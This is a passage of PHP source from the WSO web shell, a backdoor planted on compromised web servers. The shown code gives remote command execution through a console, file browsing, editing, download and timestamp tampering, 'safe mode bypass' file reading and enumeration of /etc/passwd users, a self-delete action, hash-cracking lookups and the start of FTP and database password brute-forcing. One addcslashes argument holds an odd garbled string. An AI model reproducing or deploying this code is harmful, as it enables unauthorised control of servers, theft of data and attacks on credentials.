 459                                                         } elseif ($_SESSION['act'] == 'move') {
 460                                                             function move_paste($c, $s, $d) {
 461                                                                 if (is_dir($c . $s)) {
 462                                                                     mkdir($d . $s);
 463                                                                     $h = @opendir($c . $s);
 464                                                                     while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
 465                                                                 } elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);
 466                                                             }
 467                                                             foreach ($_SESSION['f'] as $f) @rename($_SESSION['c'] . $f, $GLOBALS['cwd'] . $f);
 468                                                         } elseif ($_SESSION['act'] == 'zip') {
 469                                                             if (class_exists('ZipArchive')) {
 470                                                                 $zip = new ZipArchive();
 471                                                                 if ($zip->open($_POST['p2'], 1)) {
 472                                                                     chdir($_SESSION['c']);
 473                                                                     foreach ($_SESSION['f'] as $f) {
 474                                                                         if ($f == '..') continue;
 475                                                                         if (@is_file($_SESSION['c'] . $f)) $zip->addFile($_SESSION['c'] . $f, $f);
 476                                                                         elseif (@is_dir($_SESSION['c'] . $f)) {
 477                                                                             $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/'));
 478                                                                             foreach ($iterator as $key => $value) {
 479                                                                                 $zip->addFile(realpath($key), $key);
 480                                                                             }
 481                                                                         }
 482                                                                     }
 483                                                                     chdir($GLOBALS['cwd']);
 484                                                                     $zip->close();
 485                                                                 }
 486                                                             }
 487                                                         } elseif ($_SESSION['act'] == 'unzip') {
 488                                                             if (class_exists('ZipArchive')) {
 489                                                                 $zip = new ZipArchive();
 490                                                                 foreach ($_SESSION['f'] as $f) {
 491                                                                     if ($zip->open($_SESSION['c'] . $f)) {
 492                                                                         $zip->extractTo($GLOBALS['cwd']);
 493                                                                         $zip->close();
 494                                                                     }
 495                                                                 }
 496                                                             }
 497                                                         } elseif ($_SESSION['act'] == 'tar') {
 498                                                             chdir($_SESSION['c']);
 499                                                             $_SESSION['f'] = array_map('escapeshellarg', $_SESSION['f']);
 500                                                             wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_SESSION['f']));
 501                                                             chdir($GLOBALS['cwd']);
 502                                                         }
 503                                                         unset($_SESSION['f']);
 504                                                         break;
 505                                                     default:
 506                                                         if (!empty($_POST['p1'])) {
 507                                                             $_SESSION['act'] = @$_POST['p1'];
 508                                                             $_SESSION['f'] = @$_POST['f'];
 509                                                             foreach ($_SESSION['f'] as $k => $f) $_SESSION['f'][$k] = urldecode($f);
 510                                                             $_SESSION['c'] = @$_POST['c'];
 511                                                         }
 512                                                         break;
 513                                                     }
 514                                                 }
 515                                                 $dirContent = @scandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
 516                                                 if ($dirContent === false) {
 517                                                     echo 'Can\'t open this folder!';
 518                                                     wsoFooter();
 519                                                     return;
 520                                                 }
 521                                                 global $sort;
 522                                                 $sort = array('name', 1);
 523                                                 if (!empty($_POST['p1'])) {
 524                                                     if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);
 525                                                 }
 526                                                 echo "<script>
 527   function sa() {
 528       for(i=0;i<d.files.elements.length;i++)
 529           if(d.files.elements[i].type == 'checkbox')
 530               d.files.elements[i].checked = d.files.elements[0].checked;
 531   }
 532 </script>
 533 <table width='100%' class='main' cellspacing='0' cellpadding='2'>
 534 <form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
 535                                                 $dirs = $files = array();
 536                                                 $n = count($dirContent);
 537                                                 for ($i = 0;$i < $n;$i++) {
 538                                                     $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
 539                                                     $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
 540                                                     $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
 541                                                     if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));
 542                                                     elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
 543                                                     elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir'));
 544                                                 }
 545                                                 $GLOBALS['sort'] = $sort;
 546                                                 function wsoCmp($a, $b) {
 547                                                     if ($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
 548                                                     else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
 549                                                 }
 550                                                 usort($files, "wsoCmp");
 551                                                 usort($dirs, "wsoCmp");
 552                                                 $files = array_merge($dirs, $files);
 553                                                 $l = 0;
 554                                                 foreach ($files as $f) {
 555                                                     echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" title=' . $f['link'] . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (($f['type'] == 'file') ? wsoViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (($f['type'] == 'file') ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
 556                                                     $l = $l ? 0 : 1;
 557                                                 }
 558                                                 echo "<tr><td colspan=7>
 559   <input type=hidden name=a value='FilesMan'>
 560   <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>
 561   <input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
 562   <select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
 563                                                 if (class_exists('ZipArchive')) echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
 564                                                 echo "<option value='tar'>Compress (tar.gz)</option>";
 565                                                 if (!empty($_SESSION['act']) && @count($_SESSION['f'])) echo "<option value='paste'>Paste / Compress</option>";
 566                                                 echo "</select>&nbsp;";
 567                                                 if (!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar'))) echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>&nbsp;";
 568                                                 echo "<input type='submit' value='>>'></td></tr></form></table></div>";
 569                                                 wsoFooter();
 570                                             }
 571                                             function actionStringTools() {
 572                                                 if (!function_exists('hex2bin')) {
 573                                                     function hex2bin($p) {
 574                                                         return decbin(hexdec($p));
 575                                                     }
 576                                                 }
 577                                                 if (!function_exists('binhex')) {
 578                                                     function binhex($p) {
 579                                                         return dechex(bindec($p));
 580                                                     }
 581                                                 }
 582                                                 if (!function_exists('hex2ascii')) {
 583                                                     function hex2ascii($p) {
 584                                                         $r = '';
 585                                                         for ($i = 0;$i < strLen($p);$i+= 2) {
 586                                                             $r.= chr(hexdec($p[$i] . $p[$i + 1]));
 587                                                         }
 588                                                         return $r;
 589                                                     }
 590                                                 }
 591                                                 if (!function_exists('ascii2hex')) {
 592                                                     function ascii2hex($p) {
 593                                                         $r = '';
 594                                                         for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
 595                                                         return strtoupper($r);
 596                                                     }
 597                                                 }
 598                                                 if (!function_exists('full_urlencode')) {
 599                                                     function full_urlencode($p) {
 600                                                         $r = '';
 601                                                         for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
 602                                                         return strtoupper($r);
 603                                                     }
 604                                                 }
 605                                                 $stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);
 606                                                 if (isset($_POST['ajax'])) {
 607                                                     $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
 608                                                     ob_start();
 609                                                     if (in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']);
 610                                                     $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "target down syestem/////////////.
 611 
 612   \'") . "';
 613 ";
 614                                                     echo strlen($temp), "
 615 ", $temp;
 616                                                     exit;
 617                                                 }
 618                                                 wsoHeader();
 619                                                 echo '<h1>String conversions</h1><div class=content>';
 620                                                 if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
 621                                                 echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
 622                                                 foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
 623                                                 echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
 624                                                 if (!empty($_POST['p1'])) {
 625                                                     if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));
 626                                                 }
 627                                                 echo "</pre></div><br><h1>Search text in files:</h1><div class=content>
 628       <form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
 629           <tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
 630           <tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>
 631           <tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
 632           <tr><td></td><td><input type='submit' value='>>'></td></tr>
 633           </table></form>";
 634                                                 function wsoRecursiveGlob($path) {
 635                                                     if (substr($path, -1) != '/') $path.= '/';
 636                                                     $paths = @array_unique(@array_merge(@glob($path . $_POST['p3']), @glob($path . '*', GLOB_ONLYDIR)));
 637                                                     if (is_array($paths) && @count($paths)) {
 638                                                         foreach ($paths as $item) {
 639                                                             if (@is_dir($item)) {
 640                                                                 if ($path != $item) wsoRecursiveGlob($item);
 641                                                             } else {
 642                                                                 if (@strpos(@file_get_contents($item), @$_POST['p2']) !== false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\")'>" . htmlspecialchars($item) . "</a><br>";
 643                                                             }
 644                                                         }
 645                                                     }
 646                                                 }
 647                                                 if (@$_POST['p3']) wsoRecursiveGlob($_POST['c']);
 648                                                 echo "</div><br><h1>Search for hash:</h1><div class=content>
 649       <form method='post' target='_blank' name='hf'>
 650           <input type='text' name='hash' style='width:200px;'><br>
 651           <input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
 652           <input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"><br>
 653           <input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"><br>
 654           <input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
 655           <input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
 656       </form></div>";
 657                                                 wsoFooter();
 658                                             }
 659                                             function actionFilesTools() {
 660                                                 if (isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']);
 661                                                 if (@$_POST['p2'] == 'download') {
 662                                                     if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
 663                                                         ob_start("ob_gzhandler", 4096);
 664                                                         header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
 665                                                         if (function_exists("mime_content_type")) {
 666                                                             $type = @mime_content_type($_POST['p1']);
 667                                                             header("Content-Type: " . $type);
 668                                                         } else header("Content-Type: application/octet-stream");
 669                                                         $fp = @fopen($_POST['p1'], "r");
 670                                                         if ($fp) {
 671                                                             while (!@feof($fp)) echo @fread($fp, 1024);
 672                                                             fclose($fp);
 673                                                         }
 674                                                     }
 675                                                     exit;
 676                                                 }
 677                                                 if (@$_POST['p2'] == 'mkfile') {
 678                                                     if (!file_exists($_POST['p1'])) {
 679                                                         $fp = @fopen($_POST['p1'], 'w');
 680                                                         if ($fp) {
 681                                                             $_POST['p2'] = "edit";
 682                                                             fclose($fp);
 683                                                         }
 684                                                     }
 685                                                 }
 686                                                 wsoHeader();
 687                                                 echo '<h1>File tools</h1><div class=content>';
 688                                                 if (!file_exists(@$_POST['p1'])) {
 689                                                     echo 'File not exists';
 690                                                     wsoFooter();
 691                                                     return;
 692                                                 }
 693                                                 $uid = @posix_getpwuid(@fileowner($_POST['p1']));
 694                                                 if (!$uid) {
 695                                                     $uid['name'] = @fileowner($_POST['p1']);
 696                                                     $gid['name'] = @filegroup($_POST['p1']);
 697                                                 } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
 698                                                 echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
 699                                                 echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
 700                                                 if (empty($_POST['p2'])) $_POST['p2'] = 'view';
 701                                                 if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
 702                                                 else $m = array('Chmod', 'Rename', 'Touch');
 703                                                 foreach ($m as $v) echo '<a href=# onclick="g(null,null,null,\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
 704                                                 echo '<br><br>';
 705                                                 switch ($_POST['p2']) {
 706                                                     case 'view':
 707                                                         echo '<pre class=ml1>';
 708                                                         $fp = @fopen($_POST['p1'], 'r');
 709                                                         if ($fp) {
 710                                                             while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
 711                                                             @fclose($fp);
 712                                                         }
 713                                                         echo '</pre>';
 714                                                         break;
 715                                                     case 'highlight':
 716                                                         if (@is_readable($_POST['p1'])) {
 717                                                             echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
 718                                                             $code = @highlight_file($_POST['p1'], true);
 719                                                             echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
 720                                                         }
 721                                                         break;
 722                                                     case 'chmod':
 723                                                         if (!empty($_POST['p3'])) {
 724                                                             $perms = 0;
 725                                                             for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
 726                                                             if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
 727                                                         }
 728                                                         clearstatcache();
 729                                                         echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
 730                                                         break;
 731                                                     case 'edit':
 732                                                         if (!is_writable($_POST['p1'])) {
 733                                                             echo 'File isn\'t writeable';
 734                                                             break;
 735                                                         }
 736                                                         if (!empty($_POST['p3'])) {
 737                                                             $time = @filemtime($_POST['p1']);
 738                                                             $_POST['p3'] = substr($_POST['p3'], 1);
 739                                                             $fp = @fopen($_POST['p1'], "w");
 740                                                             if ($fp) {
 741                                                                 @fwrite($fp, $_POST['p3']);
 742                                                                 @fclose($fp);
 743                                                                 echo 'Saved!<br><script>p3_="";</script>';
 744                                                                 @touch($_POST['p1'], $time, $time);
 745                                                             }
 746                                                         }
 747                                                         echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
 748                                                         $fp = @fopen($_POST['p1'], 'r');
 749                                                         if ($fp) {
 750                                                             while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
 751                                                             @fclose($fp);
 752                                                         }
 753                                                         echo '</textarea><input type=submit value=">>"></form>';
 754                                                         break;
 755                                                     case 'hexdump':
 756                                                         $c = @file_get_contents($_POST['p1']);
 757                                                         $n = 0;
 758                                                         $h = array('00000000<br>', '', '');
 759                                                         $len = strlen($c);
 760                                                         for ($i = 0;$i < $len;++$i) {
 761                                                             $h[1].= sprintf('%02X', ord($c[$i])) . ' ';
 762                                                             switch (ord($c[$i])) {
 763                                                                 case 0:
 764                                                                     $h[2].= ' ';
 765                                                                 break;
 766                                                                 case 9:
 767                                                                     $h[2].= ' ';
 768                                                                 break;
 769                                                                 case 10:
 770                                                                     $h[2].= ' ';
 771                                                                 break;
 772                                                                 case 13:
 773                                                                     $h[2].= ' ';
 774                                                                 break;
 775                                                                 default:
 776                                                                     $h[2].= $c[$i];
 777                                                                 break;
 778                                                             }
 779                                                             $n++;
 780                                                             if ($n == 32) {
 781                                                                 $n = 0;
 782                                                                 if ($i + 1 < $len) {
 783                                                                     $h[0].= sprintf('%08X', $i + 1) . '<br>';
 784                                                                 }
 785                                                                 $h[1].= '<br>';
 786                                                                 $h[2].= "
 787 ";
 788                                                             }
 789                                                         }
 790                                                         echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
 791                                                         break;
 792                                                     case 'rename':
 793                                                         if (!empty($_POST['p3'])) {
 794                                                             if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>';
 795                                                             else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
 796                                                         }
 797                                                         echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
 798                                                         break;
 799                                                     case 'touch':
 800                                                         if (!empty($_POST['p3'])) {
 801                                                             $time = strtotime($_POST['p3']);
 802                                                             if ($time) {
 803                                                                 if (!touch($_POST['p1'], $time, $time)) echo 'Fail!';
 804                                                                 else echo 'Touched!';
 805                                                             } else echo 'Bad time format!';
 806                                                         }
 807                                                         clearstatcache();
 808                                                         echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
 809                                                         break;
 810                                                     }
 811                                                     echo '</div>';
 812                                                     wsoFooter();
 813                                                 }
 814                                                 function actionSafeMode() {
 815                                                     $temp = '';
 816                                                     ob_start();
 817                                                     switch ($_POST['p1']) {
 818                                                         case 1:
 819                                                             $temp = @tempnam($test, 'cx');
 820                                                             if (@copy("compress.zlib://" . $_POST['p2'], $temp)) {
 821                                                                 echo @file_get_contents($temp);
 822                                                                 unlink($temp);
 823                                                             } else echo 'Sorry... Can\'t open file';
 824                                                             break;
 825                                                         case 2:
 826                                                             $files = glob($_POST['p2'] . '*');
 827                                                             if (is_array($files)) foreach ($files as $filename) echo $filename . "
 828 ";
 829                                                             break;
 830                                                         case 3:
 831                                                             $ch = curl_init("file://" . $_POST['p2'] . "" . preg_replace('!\(\d+\)\s.*!', '', 'index.php'));
 832                                                             curl_exec($ch);
 833                                                             break;
 834                                                         case 4:
 835                                                             ini_restore("safe_mode");
 836                                                             ini_restore("open_basedir");
 837                                                             include ($_POST['p2']);
 838                                                             break;
 839                                                         case 5:
 840                                                             for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
 841                                                                 $uid = @posix_getpwuid($_POST['p2']);
 842                                                                 if ($uid) echo join(':', $uid) . "
 843 ";
 844                                                             }
 845                                                             break;
 846                                                         }
 847                                                         $temp = ob_get_clean();
 848                                                         wsoHeader();
 849                                                         echo '<h1>Safe mode bypass</h1><div class=content>';
 850                                                         echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
 851                                                         if ($temp) echo '<pre class="ml1" style="margin-top:5px" id="Output">' . htmlspecialchars($temp) . '</pre>';
 852                                                         echo '</div>';
 853                                                         wsoFooter();
 854                                                     }
 855                                                     function actionConsole() {
 856                                                         if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
 857                                                             $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] = true;
 858                                                             $_POST['p1'].= ' 2>&1';
 859                                                         } elseif (!empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] = false;
 860                                                         if (isset($_POST['ajax'])) {
 861                                                             $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
 862                                                             ob_start();
 863                                                             echo "d.cf.cmd.value='';
 864 ";
 865                                                             $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("
 866 $ " . $_POST['p1'] . "
 867 " . wsoEx($_POST['p1']), "
 868 
 869   \'"));
 870                                                             if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {
 871                                                                 if (@chdir($match[1])) {
 872                                                                     $GLOBALS['cwd'] = @getcwd();
 873                                                                     echo "c_='" . $GLOBALS['cwd'] . "';";
 874                                                                 }
 875                                                             }
 876                                                             echo "d.cf.output.value+='" . $temp . "';";
 877                                                             echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
 878                                                             $temp = ob_get_clean();
 879                                                             echo strlen($temp), "
 880 ", $temp;
 881                                                             exit;
 882                                                         }
 883                                                         wsoHeader();
 884                                                         echo "<script>
 885 if(window.Event) window.captureEvents(Event.KEYDOWN);
 886 var cmds = new Array('');
 887 var cur = 0;
 888 function kp(e) {
 889   var n = (window.Event) ? e.which : e.keyCode;
 890   if(n == 38) {
 891       cur--;
 892       if(cur>=0)
 893           document.cf.cmd.value = cmds[cur];
 894       else
 895           cur++;
 896   } else if(n == 40) {
 897       cur++;
 898       if(cur < cmds.length)
 899           document.cf.cmd.value = cmds[cur];
 900       else
 901           cur--;
 902   }
 903 }
 904 function add(cmd) {
 905   cmds.pop();
 906   cmds.push(cmd);
 907   cmds.push('');
 908   cur = cmds.length-1;
 909 }
 910 </script>";
 911                                                         echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
 912                                                         foreach ($GLOBALS['aliases'] as $n => $v) {
 913                                                             if ($v == '') {
 914                                                                 echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
 915                                                                 continue;
 916                                                             }
 917                                                             echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
 918                                                         }
 919                                                         if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
 920                                                         echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_SESSION[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
 921                                                         if (!empty($_POST['p1'])) {
 922                                                             echo htmlspecialchars("$ " . $_POST['p1'] . "
 923 " . wsoEx($_POST['p1']));
 924                                                         }
 925                                                         echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
 926                                                         echo '</form></div><script>d.cf.cmd.focus();</script>';
 927                                                         wsoFooter();
 928                                                     }
 929                                                     function actionLogout() {
 930                                                         session_destroy();
 931                                                         die('bye!');
 932                                                     }
 933                                                     function actionSelfRemove() {
 934                                                         if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\(\d+\)\s.*!', '', 'index.php'))) die('Shell has been removed');
 935                                                         else echo 'unlink error!';
 936                                                         if ($_POST['p1'] != 'yes') wsoHeader();
 937                                                         echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
 938                                                         wsoFooter();
 939                                                     }
 940                                                     function actionBruteforce() {
 941                                                         wsoHeader();
 942                                                         if (isset($_POST['proto'])) {
 943                                                             echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
 944                                                             if ($_POST['proto'] == 'ftp') {
 945                                                                 function bruteForce($ip, $port, $login, $pass) {
 946                                                                     $fp = @ftp_connect($ip, $port ? $port : 21);
 947                                                                     if (!$fp) return false;
 948                                                                     $res = @ftp_login($fp, $login, $pass);
 949                                                                     @ftp_close($fp);
 950                                                                     return $res;
 951                                                                 }
 952                                                             } elseif ($_POST['proto'] == 'mysql') {
 953                                                                 function bruteForce($ip, $port, $login, $pass) {
 954                                                                     $res = @mysql_connect($ip . ':' . $port ? $port : 3306, $login, $pass);
 955                                                                     @mysql_close($res);
 956                                                                     return $res;
 957                                                                 }
 958                                                             } elseif ($_POST['proto'] == 'pgsql') {
